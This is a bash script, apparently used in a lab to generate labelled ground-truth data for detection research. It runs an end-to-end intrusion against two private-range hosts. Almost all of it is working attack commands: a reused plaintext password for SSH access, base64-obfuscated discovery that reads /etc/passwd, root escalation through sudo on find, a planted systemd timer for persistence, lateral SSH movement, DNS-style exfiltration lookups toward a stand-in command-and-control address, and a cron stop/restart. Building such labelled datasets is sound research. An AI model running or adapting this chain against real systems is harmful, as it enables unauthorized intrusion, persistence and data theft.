#!/bin/bash
# L5 held-out TEST runner (authorized lab). Distinct TTPs from L1. Verified; reversible impact.
set -u
V1=10.30.1.179; V2=10.30.2.144; P='Autumn2026!Reused'
TS=$(date -u +%Y%m%dT%H%M%SZ); GT="$HOME/gt_L5_$TS.jsonl"; RUNID="L5-$TS"
PS(){ python3 /tmp/pssh.py "$1" "$2" "$P" 2>/dev/null; }
gt(){ printf '{"run":"%s","ts":"%s","stage":"%s","technique":"%s","target":"%s","status":"%s","evidence":"%s"}\n' \
      "$RUNID" "$(date -u +%FT%TZ)" "$1" "$2" "$3" "$4" "$5" | tee -a "$GT"; }
echo "=== $RUNID start $(date -u +%FT%TZ) ==="

who=$(PS dmorris@$V1 'id -un; hostname')
echo "$who" | grep -q dmorris && gt initial_compromise T1078 $V1 ok "foothold reused-cred $(echo $who|tr '\n' ' ')" || { gt initial_compromise T1078 $V1 fail "$who"; exit 1; }

# discovery hidden behind base64 (T1140 deobfuscate/decode)
B64=$(printf 'id; uname -a; cat /etc/passwd | tail -5; ss -tlnp 2>/dev/null | head; getent group sudo' | base64 -w0)
PS dmorris@$V1 "echo $B64 | base64 -d | bash" >/dev/null && gt execution_discovery T1140 $V1 ok "base64-decoded discovery"

root=$(PS dmorris@$V1 'sudo /usr/bin/find /etc/hostname -exec id -u \;' | tr -d '[:space:]')
[ "$root" = "0" ] && gt privilege_escalation T1548.003 $V1 ok "sudo find->uid0" || { gt privilege_escalation T1548.003 $V1 fail "uid=$root"; exit 1; }

# persistence: systemd timer (distinct from L1 cron)
PS dmorris@$V1 "sudo /usr/bin/find /etc/hostname -exec sh -c 'printf \"[Unit]\nDescription=kltn lab sync\n[Service]\nType=oneshot\nExecStart=/bin/true\n\" > /etc/systemd/system/kltn-lab-sync.service; printf \"[Timer]\nOnBootSec=5min\nOnUnitActiveSec=10min\n[Install]\nWantedBy=timers.target\n\" > /etc/systemd/system/kltn-lab-sync.timer; systemctl daemon-reload; systemctl enable --now kltn-lab-sync.timer' \;" >/dev/null
tmr=$(PS dmorris@$V1 "systemctl is-active kltn-lab-sync.timer" | tr -d '[:space:]')
[ "$tmr" = "active" ] && gt persistence T1053.003 $V1 ok "systemd timer kltn-lab-sync" || gt persistence T1053.003 $V1 fail "timer=$tmr"

lat=$(PS dmorris@$V1 "python3 /tmp/pssh.py dmorris@$V2 'id -un; hostname' '$P' 2>/dev/null")
echo "$lat" | grep -q ubuntu-2 && gt lateral_movement T1021.004 $V2 ok "ssh v1->v2 $(echo $lat|tr '\n' ' ')" || gt lateral_movement T1021.004 $V2 fail "$lat"

# exfil DNS-style (T1048): data-labelled lookups toward the C2 segment (best effort)
PS dmorris@$V1 "for i in 1 2 3; do getent hosts seg\$i.\$(hostname).exfil.203.0.113.66 >/dev/null 2>&1; done; echo done" >/dev/null && gt exfiltration T1048 "203.0.113.66" ok "dns-style lookups x3"

# impact: stop/restart a non-critical service (T1489), reversible
PS dmorris@$V1 "sudo /usr/bin/find /etc/hostname -exec sh -c 'systemctl stop cron 2>/dev/null; sleep 1; systemctl start cron 2>/dev/null' \;" >/dev/null
act=$(PS dmorris@$V1 "systemctl is-active cron" | tr -d '[:space:]')
gt impact T1489 $V1 ok "service cron stopped+restarted (now=$act)"
echo "=== $RUNID end $(date -u +%FT%TZ) ==="; echo "GT=$GT"; cat "$GT"
